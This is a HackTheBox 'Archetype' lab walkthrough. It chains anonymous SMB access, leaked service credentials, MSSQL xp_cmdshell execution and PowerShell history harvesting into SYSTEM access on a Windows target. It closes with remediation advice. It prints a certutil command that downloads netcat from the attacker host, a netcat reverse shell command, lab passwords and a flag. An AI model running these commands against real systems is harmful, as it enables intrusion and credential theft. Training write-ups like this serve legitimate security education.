# Archetype (HTB) - MSSQL Exploitation & Windows Egress Bypassing

**Platform:** HackTheBox (Starting Point) | **Target OS:** Windows Server 2019 | **Difficulty:** Very Easy  
**Focus:** Windows Reconnaissance, SMB Null Sessions, MSSQL Windows Authentication, LOLBins (`certutil`), Egress Firewall Bypassing, and PowerShell History Credential Harvesting.

---

## 🎯 Executive Summary
The "Archetype" machine simulates a common corporate Windows environment misconfiguration. The attack chain consisted of:
1. **Information Disclosure:** Exploiting anonymous SMB access to read a misconfigured SQL Server Integration Services (SSIS) configuration file, leaking a service account credential.
2. **Database Compromise:** Utilizing the leaked credential to authenticate against Microsoft SQL Server (MSSQL) via Windows Authentication (NTLM over TDS).
3. **RCE & Egress Evasion:** Re-enabling the `xp_cmdshell` stored procedure to execute OS-level commands. Successfully bypassing outbound firewall restrictions (Egress Filtering) by leveraging legitimate Windows binaries (LOLBins) to transfer and execute a reverse shell over an allowed port (TCP/80).
4. **Privilege Escalation:** Harvesting the local Administrator's plaintext password from the PowerShell `PSReadLine` history file, culminating in a full system compromise via `psexec.py`.

---

## 1. Network Reconnaissance & SMB Enumeration

We initiated the engagement with a targeted Nmap scan to profile exposed Windows networking services.

```bash
$ sudo nmap -sS -sV -sC --top-ports 1000 -T4 10.129.61.160
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

**SMB Anonymous Enumeration:**
We utilized `smbclient` to probe for unauthenticated shares. We discovered a custom share named `backups` allowing anonymous read access.

```bash
$ smbclient //10.129.61.160/backups -N
smb: \> dir
  prod.dtsConfig                     AR      609  Mon Jan 20 14:23:02 2020
smb: \> get prod.dtsConfig
```

**Forensic Analysis of `prod.dtsConfig`:**
Reviewing the downloaded SSIS configuration XML file revealed embedded connection string credentials for a Windows service account:
`User ID=ARCHETYPE\sql_svc; Password=M3g4c0rp123`

---

## 2. MSSQL Exploitation (`xp_cmdshell`)

We utilized Impacket's `mssqlclient.py` to authenticate against the SQL Server (Port 1433). 

**Architectural Note (Windows vs. SQL Auth):** 
A standard login attempt failed because `sql_svc` is a Windows local account, not a dedicated SQL login. By appending the `-windows-auth` flag, we instructed the tool to encapsulate NTLM authentication within the TDS (Tabular Data Stream) protocol, successfully authenticating as a `sysadmin`.

```bash
$ mssqlclient.py -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.129.61.160
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
SQL (ARCHETYPE\sql_svc  dbo@master)>
```

We attempted to achieve Remote Code Execution (RCE) via `xp_cmdshell`. It was disabled by default (a standard security posture). However, possessing `sysadmin` privileges allowed us to re-enable it trivially via `sp_configure`.

*(Note: The process of enabling `xp_cmdshell` involves setting 'show advanced options' to 1, followed by enabling 'xp_cmdshell' and running RECONFIGURE).*

---

## 3. RCE, LOLBins & Egress Firewall Troubleshooting

We attempted to download a `netcat` binary (`nc64.exe`) and execute a reverse shell over TCP/4444. The payload failed to connect back. 

**Egress Firewall Evasion:**
Suspecting an outbound (egress) firewall filtering non-standard ports, we utilized PowerShell's `Test-NetConnection` to verify outbound access to our attack machine over common web ports. Port 80 successfully routed outbound.

```sql
SQL> EXEC xp_cmdshell "powershell -c Test-NetConnection 10.10.16.216 -Port 80"
TcpTestSucceeded : True
```

We leveraged `certutil.exe` (a native Windows Living-off-the-Land Binary - LOLBin) to download the payload, evading standard network proxy alerts, and triggered the reverse shell over the unrestricted Port 80.

```sql
SQL> EXEC xp_cmdshell "certutil -urlcache -f http://10.10.16.216/nc64.exe C:\Users\Public\nc64.exe"
SQL> EXEC xp_cmdshell "C:\Users\Public\nc64.exe -e cmd.exe 10.10.16.216 80"
```

```bash
# Catching the shell locally
$ sudo nc -lnvp 80
Connection received on 10.129.61.160 49692
Microsoft Windows [Version 10.0.17763.2061]
C:\Windows\system32>
```

---

## 4. Post-Exploitation & Privilege Escalation

Operating within the context of the `sql_svc` account, we searched for post-exploitation artifacts. A prime target in modern Windows environments is the PowerShell `PSReadLine` history file, which functions similarly to Linux's `.bash_history`.

```cmd
C:\> type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```
*Intelligence Gathered:* The local Administrator's plaintext password (`MEGACORP_4dm1n!!`) was leaked due to an administrative operational error (typing credentials in the command line).

### System Compromise via PsExec
With administrative credentials acquired, we utilized Impacket's `psexec.py` to establish a high-privileged session. 

**Mechanics of PsExec:** The tool authenticates over SMB, connects to the `ADMIN$` share, uploads a randomized service executable, and utilizes the Service Control Manager (SCM) to execute the binary. This grants a shell operating as `NT AUTHORITY\SYSTEM`.

```bash
$ psexec.py administrator@10.129.61.160
Password: [MEGACORP_4dm1n!!]
[*] Found writable share ADMIN$
[*] Uploading file mwAxyuft.exe
[*] Opening SVCManager on 10.129.61.160.....
[*] Starting service owzD.....
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
b91ccec3305e98240082d4474b848528
```

---

## 5. Defensive Remediation & Hardening

1. **SMB Share Security:** The `backups` share must not allow anonymous or `Everyone` read access. Restrict access strictly to the dedicated backup service accounts.
2. **Credential Management:** Never hardcode plaintext credentials in configuration files (`.dtsConfig`). Utilize Windows Data Protection API (DPAPI) or enterprise vault solutions (e.g., CyberArk, HashiCorp Vault) for credential injection.
3. **MSSQL Hardening:** Limit the `sysadmin` server role exclusively to Database Administrators. If `xp_cmdshell` is strictly required, ensure it executes under a heavily restricted proxy account, not the default SQL service account.
4. **Operational Security Training:** Administrators must refrain from supplying passwords via command-line arguments to prevent leakage into `ConsoleHost_history.txt`.
